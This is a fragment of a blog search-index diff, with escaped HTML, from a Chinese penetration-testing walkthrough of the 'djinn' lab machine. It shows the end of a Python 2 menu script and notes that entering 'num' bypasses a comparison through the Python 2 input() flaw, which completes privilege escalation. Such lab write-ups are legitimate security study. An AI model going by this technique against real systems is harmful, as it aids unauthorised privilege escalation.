+&lt;p&gt;def main(op):&lt;br&gt;
+if op == 1:&lt;br&gt;
+naughtyboi()&lt;br&gt;
+elif op == 2:&lt;br&gt;
+guessit()&lt;br&gt;
+elif op == 3:&lt;br&gt;
+readfiles()&lt;br&gt;
+elif op == 4:&lt;br&gt;
+print &#39;work your ass off!!&#39;&lt;br&gt;
+else:&lt;br&gt;
+print &#39;Do something better with your life&#39;&lt;/p&gt;
+&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == &#39;&lt;strong&gt;main&lt;/strong&gt;&#39;:&lt;br&gt;
+main(options())&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我们可以&lt;a href=&#34;https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/&#34;&gt;输入num来绕过比对&lt;/a&gt;&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;17&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629717024690.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;至此提权成功&lt;/p&gt;
+">渗透测试之djinn</a>
+      </div>
       
       <div class="item">
         <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-born2rootv2/"" data-c="
